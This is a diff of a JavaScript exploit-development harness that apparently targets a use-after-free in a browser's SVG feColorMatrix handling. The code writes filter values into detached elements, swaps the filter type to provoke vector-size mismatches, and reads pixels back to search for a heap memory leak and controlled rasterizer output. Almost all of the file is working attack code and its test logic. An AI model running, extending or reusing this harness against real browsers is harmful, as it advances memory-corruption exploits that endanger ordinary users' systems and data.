+ * PROOF: write baseVal[0] = 2 via UAF.
+ * Expected: R_out = 2 * (200/255) * 255 = 2*200 = 400 -> clamp to 255.
+ * matrix[0,0]=2 baked gives R=255 (confirmed in v31 MXS).
+ * If UAF write of 2 gives R=255: UAF confirmed to feed rasterizer correctly.
+ *
+ * Also test: write specific values from the MXS "good" range:
+ *   UAF write 2   -> expect R=255
+ *   UAF write 10  -> expect R=255
+ *   UAF write 100 -> expect R=255
+ *   UAF write 1e3 -> expect R=0 (known bad value)
+ *   UAF write 1e4 -> expect R=255 (known good value)
+ *
+ * This also verifies: the UAF write value is preserved correctly through re-add.
+ *
+ * EXTENDED: also write to baseVal[1] (matrix[0,1] = G->R channel).
+ * bias: col 4 entries are baseVal[4], baseVal[9], baseVal[14], baseVal[19].
+ * Write baseVal[4] = 1e38 via UAF -> should give R=255 (bias term works with 1e38).
+ */
+async function runUFV(q) {
+  if (!q) { dis(true); sep(); log('UFV: UAF write verify — confirm UAF feeds rasterizer', 'inf'); sep(); }
+
+  var ID = '1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
+  var testVals = [
+    { v: 2,    idx: 0, expect: 255, note: 'matrix[0,0]=2 (baked=255)' },
+    { v: 10,   idx: 0, expect: 255, note: 'matrix[0,0]=10 (baked=255)' },
+    { v: 100,  idx: 0, expect: 255, note: 'matrix[0,0]=100 (baked=255)' },
+    { v: 1e3,  idx: 0, expect: 0,   note: 'matrix[0,0]=1e3 (baked=0 - int overflow)' },
+    { v: 1e4,  idx: 0, expect: 255, note: 'matrix[0,0]=1e4 (baked=255)' },
+    { v: 1e5,  idx: 0, expect: 0,   note: 'matrix[0,0]=1e5 (baked=0)' },
+    { v: 1e6,  idx: 0, expect: 255, note: 'matrix[0,0]=1e6 (baked=255)' },
+    { v: 1e8,  idx: 0, expect: 0,   note: 'matrix[0,0]=1e8 (baked=0)' },
+    { v: 1e38, idx: 4, expect: 255, note: 'bias[0,4]=1e38 (baked=255, bias works)' },
+    { v: 0,    idx: 0, expect: 0,   note: 'matrix[0,0]=0 (expected: R channel zeroed -> R=0)' },
+    { v: -1,   idx: 0, expect: 0,   note: 'matrix[0,0]=-1 (negative -> clamp 0)' },
+    { v: 0.5,  idx: 0, expect: 100, note: 'matrix[0,0]=0.5 (0.5 * 200 = 100)' }
+  ];
+
+  log('  testing UAF write at specific baseVal indices:', 'inf');
+  for (var ti = 0; ti < testVals.length; ti++) {
+    var tv = testVals[ti];
+    var dom = await buildLiveFCM(ID);
+
+    // UAF: remove, write baseVal[idx], re-add
+    dom.fcm.remove(); await raf();
+    var wrote = null;
+    try {
+      dom.fcm.values.baseVal[tv.idx].value = tv.v;
+      wrote = dom.fcm.values.baseVal[tv.idx].value;
+    } catch(e) { wrote = 'ERR:' + e; }
+    dom.filter.appendChild(dom.fcm); await raf(); await raf();
+
+    var px = await readPixelFromLive(dom.svg);
+    var R = px ? px[0] : -1;
+    var match = Math.abs(R - tv.expect) <= 2;
+    var note = match ? ' [MATCHES EXPECTED]' : ' <- MISMATCH expected=' + tv.expect;
+    log('  idx=' + tv.idx + ' write=' + tv.v + ' -> wrote=' + wrote + ' R=' + R + note,
+        match ? 'ok' : 'bad');
+    document.body.removeChild(dom.svg);
   }
-  log('  ' + note3, attrPx && attrPx[0] !== 200 ? 'bad' : 'ok');
-  document.body.removeChild(outerSvg2);
 
-  // Phase 3: type swap attack
-  log('  phase3: feColorMatrix type swap after remove (matrix -> hueRotate)', 'inf');
-  var outerSvg3 = document.createElementNS(SVG_NS, 'svg');
-  outerSvg3.setAttribute('width', '200'); outerSvg3.setAttribute('height', '200');
-  outerSvg3.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
-  var defs3 = document.createElementNS(SVG_NS, 'defs');
-  var filter3 = document.createElementNS(SVG_NS, 'filter');
-  filter3.setAttribute('id', 'uaf_f3');
-  var fcm3 = document.createElementNS(SVG_NS, 'feColorMatrix');
-  fcm3.setAttribute('type', 'matrix'); // 20-element matrix storage
-  fcm3.setAttribute('values', '1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-  filter3.appendChild(fcm3); defs3.appendChild(filter3); outerSvg3.appendChild(defs3);
-  var target3 = document.createElementNS(SVG_NS, 'rect');
-  target3.setAttribute('x', '50'); target3.setAttribute('y', '50');
-  target3.setAttribute('width', '100'); target3.setAttribute('height', '100');
-  target3.setAttribute('fill', 'rgb(200,100,50)');
-  target3.setAttribute('filter', 'url(#uaf_f3)');
-  outerSvg3.appendChild(target3);
-  document.body.appendChild(outerSvg3);
-  await raf();
+  if (!q) dis(false);
+}
 
-  // Remove, swap type, set values to 1e38, re-add
-  fcm3.remove(); await raf();
-  try {
-    fcm3.setAttribute('type', 'hueRotate'); // type was 'matrix' (20 elements), now 'hueRotate' (1 element)
-    fcm3.setAttribute('values', '1e38');    // only 1 value needed for hueRotate
-    log('  type swapped to hueRotate, values=1e38 on detached element', 'inf');
-  } catch(e3) { log('  type swap error: ' + e3, 'bad'); }
-  filter3.appendChild(fcm3); await raf(); await raf();
+/*
+ * TSV: type-swap vector size mismatch
+ *
+ * v31: type-swap (matrix->hueRotate on detached elem) gives 0,0,0.
+ *      baked hueRotate(1e38) gives 25,150,63.
+ * DISCREPANCY: live DOM type-swap doesn't produce same result as baked.
+ *
+ * NEW APPROACH: write all 20 values of baseVal via UAF BEFORE type-swap.
+ * Then type-swap via setAttribute on DETACHED element.
+ * Then re-add.
+ *
+ * The goal: the C++ feColorMatrix object has m_values (std::vector<float> or float[20])
+ * populated with 1e38 x 20 entries.
+ * After type-swap to hueRotate: the C++ code reads m_values[0] as the angle.
+ * m_values[0] = 1e38. So hueRotate(1e38) should run.
+ * If it matches baked hueRotate(1e38): type-swap UAF feeds C++ hueRotate path.
+ * If it gives 0: the type-swap clears/resets the values on re-add.
+ * If it CRASHES: the C++ code path for hueRotate expected 1 element but got 20.
+ *
+ * ALSO: test matrix->saturate (1 element needed instead of 20).
+ * ALSO: test hueRotate->matrix (1 element available, but 20 expected).
+ *   hueRotate has values = [angle]. After swap to matrix:
+ *   C++ reads m_values[0..19] but only m_values[0] was set. [1..19] = ?
+ *   If default-initialized to 0: identity with [0,0]=angle, rest=0 -> mostly black.
+ *   If left as garbage from previous allocation: potential info leak from freed memory.
+ */
+async function runTSV(q) {
+  if (!q) { dis(true); sep(); log('TSV: type-swap vector size mismatch exploit', 'inf'); sep(); }
 
-  var svgStr3 = new XMLSerializer().serializeToString(outerSvg3);
-  var blob3 = new Blob([svgStr3], { type: 'image/svg+xml' });
-  var url3 = URL.createObjectURL(blob3);
-  var img3 = new Image();
-  var typePx = await new Promise(function(resolve) {
-    img3.onload = function() {
-      try {
-        var cc3 = getCanvas();
-        cc3.ctx.clearRect(0, 0, 200, 200);
-        cc3.ctx.drawImage(img3, 0, 0);
-        var p3 = cc3.ctx.getImageData(100, 100, 1, 1);
-        resolve([p3.data[0], p3.data[1], p3.data[2], p3.data[3]]);
-      } catch(e4) { resolve(null); }
-    };
-    img3.onerror = function() { resolve(null); };
-    img3.src = url3;
-    setTimeout(function() { resolve(null); }, 2000);
-  });
-  URL.revokeObjectURL(url3);
-  log('  type-swap canvas readback: px=' + (typePx ? typePx.slice(0,3) : 'err'), 'inf');
-  // Compare to hueRotate(1e38) result from v30: px=25,150,63
-  log('  [compare: hueRotate(1e38) baked = 25,150,63 from v30]', 'dim');
-  if (typePx) {
-    var match = Math.abs(typePx[0]-25) < 5 && Math.abs(typePx[1]-150) < 5 && Math.abs(typePx[2]-63) < 5;
-    log('  type-swap matches baked hueRotate(1e38): ' + match, match ? 'ok' : 'bad');
+  var ID = '1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
+
+  // Reference: baked hueRotate(1e38) from v31 = 25,150,63
+  log('  ref: baked hueRotate(1e38)=25,150,63 (from v31)', 'inf');
+
+  // Test A: write all 20 baseVal entries = 1e38 via UAF, then type-swap matrix->hueRotate
+  log('  TestA: UAF write 20x1e38, then type-swap matrix->hueRotate', 'inf');
+  {
+    var dom = await buildLiveFCM(ID);
+    dom.fcm.remove(); await raf();
+    var writeCount = 0;
+    try {
+      for (var i = 0; i < dom.fcm.values.baseVal.length; i++) {
+        dom.fcm.values.baseVal[i].value = BIG;
+        writeCount++;
+      }
+    } catch(e) { log('  write error at i=' + writeCount + ': ' + e, 'bad'); }
+    log('  wrote ' + writeCount + '/20 entries to 1e38', 'inf');
+
+    // Now type-swap on detached element
+    try {
+      dom.fcm.setAttribute('type', 'hueRotate');
+      dom.fcm.setAttribute('values', '1e38'); // redundant but set for consistency
+    } catch(e2) { log('  type-swap error: ' + e2, 'bad'); }
+
+    dom.filter.appendChild(dom.fcm); await raf(); await raf();
+    var px = await readPixelFromLive(dom.svg);
+    var matchesBaked = px && Math.abs(px[0]-25) <= 3 && Math.abs(px[1]-150) <= 3 && Math.abs(px[2]-63) <= 3;
+    log('  TestA px=' + (px ? px.slice(0,3) : 'err') + (matchesBaked ? ' [MATCHES baked hueRotate(1e38)!]' : ' (no match)'),
+        matchesBaked ? 'bad' : 'ok');
+    document.body.removeChild(dom.svg);
   }
-  document.body.removeChild(outerSvg3);
+
+  // Test B: type-swap matrix->saturate (also 1 element)
+  log('  TestB: UAF write [0]=1e38, type-swap matrix->saturate', 'inf');
+  {
+    var domB = await buildLiveFCM(ID);
+    domB.fcm.remove(); await raf();
+    try { domB.fcm.values.baseVal[0].value = BIG; } catch(e) {}
+    try {
+      domB.fcm.setAttribute('type', 'saturate');
+      domB.fcm.setAttribute('values', '1e38');
+    } catch(e2) {}
+    domB.filter.appendChild(domB.fcm); await raf(); await raf();
+    var pxB = await readPixelFromLive(domB.svg);
+    log('  TestB px=' + (pxB ? pxB.slice(0,3) : 'err'), 'inf');
+    document.body.removeChild(domB.svg);
+  }
+
+  // Test C: start as hueRotate, write values via UAF (only 1 element), then swap to matrix
+  // hueRotate has exactly 1 element in values list.
+  // After swap to matrix: C++ expects 20 elements but has 1.
+  // Remaining 19 may be uninitialized memory OR default 0.
+  log('  TestC: start hueRotate(180), UAF write [0]=1e38, type-swap hueRotate->matrix', 'inf');
+  {
+    var outerC = document.createElementNS(SVG_NS, 'svg');
+    outerC.setAttribute('width', '200'); outerC.setAttribute('height', '200');
+    outerC.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
+    var defsC = document.createElementNS(SVG_NS, 'defs');
+    var filterC = document.createElementNS(SVG_NS, 'filter');
+    filterC.setAttribute('id', 'v32fC');
+    filterC.setAttribute('color-interpolation-filters', 'sRGB');
+    var fcmC = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmC.setAttribute('type', 'hueRotate');
+    fcmC.setAttribute('values', '180');
+    filterC.appendChild(fcmC); defsC.appendChild(filterC); outerC.appendChild(defsC);
+    var rectC = document.createElementNS(SVG_NS, 'rect');
+    rectC.setAttribute('x', '50'); rectC.setAttribute('y', '50');
+    rectC.setAttribute('width', '100'); rectC.setAttribute('height', '100');
+    rectC.setAttribute('fill', 'rgb(200,100,50)');
+    rectC.setAttribute('filter', 'url(#v32fC)');
+    outerC.appendChild(rectC);
+    document.body.appendChild(outerC);
+    await raf(); await raf();
+
+    // check initial values length
+    var initLen = -1;
+    try { initLen = fcmC.values.baseVal.length; } catch(e) {}
+    log('  hueRotate values.baseVal.length=' + initLen, 'inf');
+
+    // UAF
+    fcmC.remove(); await raf();
+    var writeValC = null;
+    try {
+      fcmC.values.baseVal[0].value = BIG;
+      writeValC = fcmC.values.baseVal[0].value;
+    } catch(e) { writeValC = 'ERR'; }
+    log('  wrote hueRotate baseVal[0]=' + writeValC, 'inf');
+
+    // type-swap to matrix
+    try {
+      fcmC.setAttribute('type', 'matrix');
+      // don't set new values — let it use whatever's in the C++ vector
+    } catch(e2) {}
+
+    filterC.appendChild(fcmC); await raf(); await raf();
+
+    // check new values length after swap
+    var newLen = -1;
+    try { newLen = fcmC.values.baseVal.length; } catch(e) {}
+    log('  after type-swap to matrix: values.baseVal.length=' + newLen, 'inf');
+
+    var pxC = await readPixelFromLive(outerC);
+    log('  TestC px=' + (pxC ? pxC.slice(0,3) : 'err'), pxC && (pxC[0] > 0 && pxC[0] < 255) ? 'bad' : 'inf');
+
+    // KEY: read back what baseVal[1..5] contain after type-swap (should be 0 if reset, or garbage if reused memory)
+    var readVals = [];
+    try {
+      for (var ri = 0; ri < Math.min(5, fcmC.values.baseVal.length); ri++) {
+        readVals.push(fcmC.values.baseVal[ri].value);
+      }
+    } catch(e3) {}
+    log('  baseVal[0..4] after swap: ' + readVals.join(', '), 'inf');
+    document.body.removeChild(outerC);
+  }
+
+  // Test D: matrix with 1e38 in ROW 1-3 diagonal (G,B,A scale), not R
+  log('  TestD: UAF write baseVal[6]=1e38 (G scale), [12]=1e38 (B scale)', 'inf');
+  {
+    var domD = await buildLiveFCM(ID);
+    domD.fcm.remove(); await raf();
+    // matrix layout: [0,0]=baseVal[0]...[0,4]=baseVal[4], [1,0]=baseVal[5]...[1,4]=baseVal[9], etc.
+    // [1,1] (G scale) = baseVal[6], [2,2] (B scale) = baseVal[12]
+    try {
+      domD.fcm.values.baseVal[6].value = BIG;  // G scale = 1e38 -> G out = huge -> 255
+      domD.fcm.values.baseVal[0].value = 2;    // R scale = 2 -> R=255 (known working)
+    } catch(e) {}
+    domD.filter.appendChild(domD.fcm); await raf(); await raf();
+    var pxD = await readPixelFromLive(domD.svg);
+    log('  TestD px=' + (pxD ? pxD.slice(0,3) : 'err'), 'inf');
+    log('  TestD: R=255? -> ' + (pxD && pxD[0]===255) + '  G=? (1e38 on G scale) -> G=' + (pxD ? pxD[1] : '?'), 'inf');
+    document.body.removeChild(domD.svg);
+  }
+
+  if (!q) dis(false);
+}
+
+/*
+ * MXN: narrow the MXS flip points
+ *
+ * v31 MXS:
+ *   1e3 -> 0, 1e4 -> 255, 1e5 -> 0, 1e6 -> 255, 1e8 -> 0 (permanent).
+ *
+ * Binary search in [1e3, 1e4] to find exact flip value.
+ * Then in [1e5, 1e6].
+ *
+ * WHAT THIS TELLS US:
+ * If flip at exactly 2^K or 10^K: it's a bit pattern cutoff.
+ * float32 representation of 1e3 = 0x447A0000. 1e4 = 0x461C4000.
+ * If flip between 1e3 and 1e4 at some specific exponent: tells us the internal int size.
+ *
+ * Example: if flip happens at ~32768 (2^15 = 0x8000):
+ *   WebKit stores matrix values as int16 (signed short).
+ *   int16(32768) overflows to -32768.
+ *   -32768 * 200 / 32768 = -200 -> clamp to 0. That gives R=0!
+ *   int16(10000) = 10000. 10000 * 200 / 32768 = 61.0 -> *255... no still wrong.
+ *
+ * Better theory: FIXED POINT Q8.8 (range -128..127 integer, 8 fraction bits):
+ *   Q8.8(1000) = 1000 * 256 = 256000. Overflow int16 (max 32767): wraps to -256000 mod 65536 = 0.
+ *   Q8.8(10000) overflows more but maybe wraps to positive? Unlikely.
+ *
+ * SIMPLEST THEORY THAT FITS:
+ *   WebKit processes feColorMatrix values as float32 and result as uint8.
+ *   Result = (uint8_t)((int32_t)(matrix_val * src_float_normalized * 255.0f))
+ *   For matrix_val=1e3, src=200/255=0.784:
+ *     intermediate = 1e3 * 0.784 * 255 = 199920.0
+ *     (int32_t)(199920.0) = 199920
+ *     (uint8_t)(199920) = 199920 & 0xFF = 0x30D40 & 0xFF = 0x40 = 64. Not 0.
+ *
+ *   OR result before channel scaling:
+ *     result_normalized = 1e3 * 0.784 = 784.
+ *     (uint8_t)((int32_t)(784 * 255)) = (uint8_t)(199920) = 0x40 = 64. Not 0.
+ *
+ *   OR result as fraction then int:
+ *     result = min(1e3 * 0.784, 1.0) = 1.0. (uint8_t)(1.0 * 255) = 255. Still not 0.
+ *
+ * WE NEED THE BINARY SEARCH DATA to figure out the actual formula.
+ */
+async function runMXN(q) {
+  if (!q) { dis(true); sep(); log('MXN: narrow feColorMatrix flip points via binary search', 'inf'); sep(); }
+
+  function makeBakedColorMatrix(val00) {
+    var mat = val00 + ' 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
+    return '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">' +
+      '<defs><filter id="f" color-interpolation-filters="sRGB">' +
+        '<feColorMatrix type="matrix" values="' + mat + '"/>' +
+      '</filter></defs>' +
+      '<rect x="50" y="50" width="100" height="100" fill="rgb(200,100,50)" filter="url(#f)"/>' +
+    '</svg>';
+  }
+
+  async function getR(val) {
+    var px = await svgPixelFromStr(makeBakedColorMatrix(val));
+    return px ? px[0] : -1;
+  }
+
+  // Phase 1: dense sweep 1e3..1e4 to find flip
+  log('  phase1: dense sweep 1000..10000 (step x1.5)', 'inf');
+  var v = 1000;
+  var lastR = await getR(v);
+  log('  ' + v.toFixed(0) + ' R=' + lastR, 'dim');
+  while (v < 10000) {
+    var vNext = Math.min(v * 1.5, 10000);
+    if (vNext === v) break;
+    v = vNext;
+    var R = await getR(v);
+    var flip = (lastR === 0 && R === 255) || (lastR === 255 && R === 0);
+    log('  ' + v.toFixed(0) + ' R=' + R + (flip ? ' [FLIP]' : ''), flip ? 'bad' : 'dim');
+    lastR = R;
+  }
+
+  // Phase 2: binary search 1e3..1e4 for exact boundary
+  log('  phase2: binary search for exact 0->255 boundary in [1000, 10000]', 'inf');
+  var lo = 1000; var hi = 10000; var iterations = 0;
+  var rLo = await getR(lo); var rHi = await getR(hi);
+  log('  lo=' + lo + ' R=' + rLo + '  hi=' + hi + ' R=' + rHi, 'inf');
+
+  if (rLo !== rHi) {
+    while (hi - lo > 1 && iterations < 20) {
+      var mid = (lo + hi) / 2;
+      var rMid = await getR(mid);
+      log('  mid=' + mid.toFixed(2) + ' R=' + rMid, 'dim');
+      if (rMid === rLo) { lo = mid; rLo = rMid; }
+      else { hi = mid; rHi = rMid; }
+      iterations++;
+    }
+    log('  FLIP BOUNDARY: ' + lo.toFixed(2) + ' (R=' + rLo + ') -> ' + hi.toFixed(2) + ' (R=' + rHi + ')', 'bad');
+    log('  boundary value: ~' + ((lo + hi) / 2).toFixed(2), 'bad');
+    log('  as hex: 0x' + Math.round((lo + hi) / 2).toString(16), 'bad');
+    log('  as power of 2: 2^' + Math.log2((lo + hi) / 2).toFixed(3), 'bad');
+  } else {
+    log('  lo and hi have same R=' + rLo + ' — no flip in this range', 'inf');
+  }
+
+  // Phase 3: binary search in [1e4, 1e5] for next flip (255->0)
+  log('  phase3: binary search for 255->0 boundary in [1e4, 1e5]', 'inf');
+  var lo2 = 1e4; var hi2 = 1e5; var iter2 = 0;
+  var rLo2 = await getR(lo2); var rHi2 = await getR(hi2);
+  log('  lo=' + lo2.toExponential(1) + ' R=' + rLo2 + '  hi=' + hi2.toExponential(1) + ' R=' + rHi2, 'inf');
+  if (rLo2 !== rHi2) {
+    while (hi2 - lo2 > 1 && iter2 < 20) {
+      var mid2 = (lo2 + hi2) / 2;
+      var rMid2 = await getR(mid2);
+      log('  mid=' + mid2.toFixed(0) + ' R=' + rMid2, 'dim');
+      if (rMid2 === rLo2) { lo2 = mid2; rLo2 = rMid2; }
+      else { hi2 = mid2; rHi2 = rMid2; }
+      iter2++;
+    }
+    log('  FLIP BOUNDARY: ' + lo2.toFixed(0) + ' -> ' + hi2.toFixed(0), 'bad');
+    log('  boundary value: ~' + Math.round((lo2 + hi2) / 2), 'bad');
+    log('  as hex: 0x' + Math.round((lo2 + hi2) / 2).toString(16), 'bad');
+    log('  as power of 2: 2^' + Math.log2((lo2 + hi2) / 2).toFixed(3), 'bad');
+  } else {
+    log('  same R on both ends — no flip in [1e4, 1e5]', 'inf');
+  }
+
+  // Phase 4: different source colors at flip-adjacent values
+  log('  phase4: different fill colors at matrix[0,0]=1e3 vs 1e4 (int overflow hypothesis)', 'inf');
+  var flipAdj = [1e3, 1e4];
+  var testColors = ['rgb(1,0,0)', 'rgb(64,0,0)', 'rgb(128,0,0)', 'rgb(200,0,0)', 'rgb(255,0,0)'];
+  for (var fi = 0; fi < flipAdj.length; fi++) {
+    var mv = flipAdj[fi];
+    for (var ci = 0; ci < testColors.length; ci++) {
+      var col = testColors[ci];
+      var rVal = parseInt(col.match(/\d+/)[0]);
+      var svgStr = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">' +
+        '<defs><filter id="f" color-interpolation-filters="sRGB">' +
+          '<feColorMatrix type="matrix" values="' + mv + ' 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0"/>' +
+        '</filter></defs>' +
+        '<rect x="50" y="50" width="100" height="100" fill="' + col + '" filter="url(#f)"/>' +
+      '</svg>';
+      var px = await svgPixelFromStr(svgStr);
+      var R = px ? px[0] : -1;
+      log('  mv=' + mv.toExponential(0) + ' fill.R=' + rVal + ' -> out.R=' + R, R > 0 && R < 255 ? 'bad' : 'dim');
+    }
+  }
+
+  if (!q) dis(false);
+}
+
+/*
+ * CMB: Combined UAF + controlled output
+ *
+ * Using knowledge from UFV (UAF feeds rasterizer) and MXN (flip boundaries):
+ * Write specific values to baseVal[0] via UAF that produce PREDICTABLE output.
+ * Goal: show that UAF gives arbitrary control over the feColorMatrix rasterizer output.
+ *
+ * If UAF can write arbitrary floats and the rasterizer is a deterministic function of them,
+ * then UAF = controlled rasterizer output.
+ *
+ * From MXN, we'll have exact boundary values.
+ * Use those to write values that produce specific R outputs:
+ *   write V just below lower boundary -> R=0
+ *   write V in [lower, upper] -> R=255
+ *   write V above upper -> R=0 or 255 (alternating)
+ *
+ * ALSO: multi-channel control test.
+ * Can we independently control R, G, B output via UAF?
+ *   baseVal[0] = R scale (matrix[0,0]) -> controls R channel out
+ *   baseVal[6] = G scale (matrix[1,1]) -> controls G channel out
+ *   baseVal[12] = B scale (matrix[2,2]) -> controls B channel out
+ * Write each independently. Observe if channels respond independently.
+ * If yes: we have 3-channel arbitrary pixel output via UAF.
+ */
+async function runCMB(q) {
+  if (!q) { dis(true); sep(); log('CMB: combined UAF controlled output + multi-channel', 'inf'); sep(); }
+
+  var ID = '1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
+
+  // Multi-channel independent control test
+  log('  multi-channel UAF: write R/G/B scales independently', 'inf');
+
+  var channelTests = [
+    // Each entry: [baseVal_R_idx, R_val, baseVal_G_idx, G_val, baseVal_B_idx, B_val, expected_note]
+    // Identity test
+    { r: 0, rv: 1,   g: 6, gv: 1,   b: 12, bv: 1,   note: 'identity (all=1)' },
+    // Scale only R up (expect R=255, G/B unchanged)
+    { r: 0, rv: 2,   g: 6, gv: 1,   b: 12, bv: 1,   note: 'R=2 (expect R=255, G=99, B=50)' },
+    // Scale only G up
+    { r: 0, rv: 1,   g: 6, gv: 2,   b: 12, bv: 1,   note: 'G=2 (expect R=200, G=255, B=50)' },
+    // Scale only B up
+    { r: 0, rv: 1,   g: 6, gv: 1,   b: 12, bv: 2,   note: 'B=2 (expect R=200, G=99, B=255)' },
+    // All to 2
+    { r: 0, rv: 2,   g: 6, gv: 2,   b: 12, bv: 2,   note: 'all=2 (expect all 255)' },
+    // R=0, G=2, B=0 (zero R and B)
+    { r: 0, rv: 0,   g: 6, gv: 2,   b: 12, bv: 0,   note: 'R=0,G=2,B=0 (expect R=0,G=255,B=0)' },
+    // Target pixel: R=100, G=50, B=200 (write scale factors to produce this)
+    // Input is (200, 100, 50). For output (100, 50, 200):
+    //   R_scale = 100 / 200 = 0.5 -> baseVal[0]=0.5
+    //   G_scale = 50 / 100 = 0.5 -> baseVal[6]=0.5
+    //   B_scale = 200 / 50 = 4.0 -> baseVal[12]=4.0
+    { r: 0, rv: 0.5, g: 6, gv: 0.5, b: 12, bv: 4.0, note: 'target (100,50,200): R=0.5 G=0.5 B=4' },
+    // Overflow test: R=1e3 (known zero), G=1e4 (known 255), B=1 (pass)
+    { r: 0, rv: 1e3, g: 6, gv: 1e4, b: 12, bv: 1,   note: 'R=1e3(->0) G=1e4(->255) B=1(->50)' }
+  ];
+
+  for (var ti = 0; ti < channelTests.length; ti++) {
+    var ct = channelTests[ti];
+    var dom = await buildLiveFCM(ID);
+    dom.fcm.remove(); await raf();
+    try {
+      dom.fcm.values.baseVal[ct.r].value = ct.rv;
+      dom.fcm.values.baseVal[ct.g].value = ct.gv;
+      dom.fcm.values.baseVal[ct.b].value = ct.bv;
+    } catch(e) { log('  write error: ' + e, 'bad'); }
+    dom.filter.appendChild(dom.fcm); await raf(); await raf();
+    var px = await readPixelFromLive(dom.svg);
+    log('  ' + ct.note + ': px=' + (px ? px.slice(0,3) : 'err'), 'inf');
+    document.body.removeChild(dom.svg);
+  }
+
+  // SMIL animation + UAF interaction
+  log('  SMIL+UAF: animate values, UAF write during animation', 'inf');
+  {
+    var outerS = document.createElementNS(SVG_NS, 'svg');
+    outerS.setAttribute('width', '200'); outerS.setAttribute('height', '200');
+    outerS.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
+    var defsS = document.createElementNS(SVG_NS, 'defs');
+    var filterS = document.createElementNS(SVG_NS, 'filter');
+    filterS.setAttribute('id', 'v32fS');
+    filterS.setAttribute('color-interpolation-filters', 'sRGB');
+    var fcmS = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmS.setAttribute('type', 'matrix');
+    fcmS.setAttribute('values', ID);
+
+    // Add SMIL animate for the values
+    var anim = document.createElementNS(SVG_NS, 'animate');
+    anim.setAttribute('attributeName', 'values');
+    anim.setAttribute('from', ID);
+    anim.setAttribute('to', '1e38 0 0 0 0  0 1e38 0 0 0  0 0 1e38 0 0  0 0 0 1 0');
+    anim.setAttribute('dur', '10s');
+    anim.setAttribute('fill', 'freeze');
+    anim.setAttribute('begin', '0s');
+    fcmS.appendChild(anim);
+
+    filterS.appendChild(fcmS); defsS.appendChild(filterS); outerS.appendChild(defsS);
+    var rectS = document.createElementNS(SVG_NS, 'rect');
+    rectS.setAttribute('x', '50'); rectS.setAttribute('y', '50');
+    rectS.setAttribute('width', '100'); rectS.setAttribute('height', '100');
+    rectS.setAttribute('fill', 'rgb(200,100,50)');
+    rectS.setAttribute('filter', 'url(#v32fS)');
+    outerS.appendChild(rectS);
+    document.body.appendChild(outerS);
+    await raf(); await raf();
+
+    // Immediately UAF write (animation running)
+    fcmS.remove(); await raf();
+    var writeS = false;
+    try {
+      fcmS.values.baseVal[0].value = 2;
+      writeS = true;
+    } catch(e) {}
+    filterS.appendChild(fcmS); await raf(); await raf();
+
+    var pxS = await readPixelFromLive(outerS);
+    log('  SMIL+UAF write=2 during animation: px=' + (pxS ? pxS.slice(0,3) : 'err') + ' writeOk=' + writeS,
+        pxS && pxS[0] === 255 ? 'ok' : 'inf');
+    document.body.removeChild(outerS);
+  }
 
   if (!q) dis(false);
 }
@@ -659,16 +649,14 @@ async function runUAF(q) {
 // RUN ALL
 async function runAll() {
   dis(true); clearLog(); sep();
-  log('SVG UAF v31 - feConvolveMatrix neg kernel + feColorMatrix matrix sweep + UAF', 'inf');
+  log('SVG UAF v32 - UAF feed verify + type-swap vector mismatch + MXS narrow + combined', 'inf');
   sep();
-
   var tests = [
-    ['CNK_neg_kernel',     runCNK],
-    ['MXS_matrix_sweep',   runMXS],
-    ['CNV_targetX_kul',    runCNV],
-    ['UAF_colormatrix',    runUAF]
+    ['UFV_uaf_feed_verify',    runUFV],
+    ['TSV_type_swap_vector',   runTSV],
+    ['MXN_mxs_narrow',        runMXN],
+    ['CMB_combined',           runCMB]
   ];
-
   for (var i = 0; i < tests.length; i++) {
     var lbl = tests[i][0]; var fn = tests[i][1];
     sep(); log(lbl, 'inf'); sep();
@@ -676,14 +664,13 @@ async function runAll() {
     catch(e) { log('[!] ' + lbl + ': threw ' + e, 'bad'); }
     log('');
   }
-
   sep();
-  log('SUMMARY v31', 'inf');
+  log('SUMMARY v32', 'inf');
   sep();
-  log('  CNK: look for [FLIP POINT] - negative kernel flip and intermediate values', 'inf');
-  log('  MXS: look for [FLIP POINT] in matrix[0,0] sweep', 'inf');
-  log('  CNV: look for INTERMEDIATE VALUE or INT_MAX survival', 'inf');
-  log('  UAF: look for writeOk=true and unexpected canvas output', 'inf');
+  log('  UFV: UAF write 2 -> R=255? confirms UAF feeds rasterizer directly', 'inf');
+  log('  TSV: TestC baseVal[1..4] after type-swap -> garbage = heap leak via feColorMatrix?', 'inf');
+  log('  MXN: boundary value in hex -> tells us the internal int width', 'inf');
+  log('  CMB: multi-channel control -> if channels independent, UAF = arbitrary pixel output', 'inf');
   sep();
   dis(false);
 }
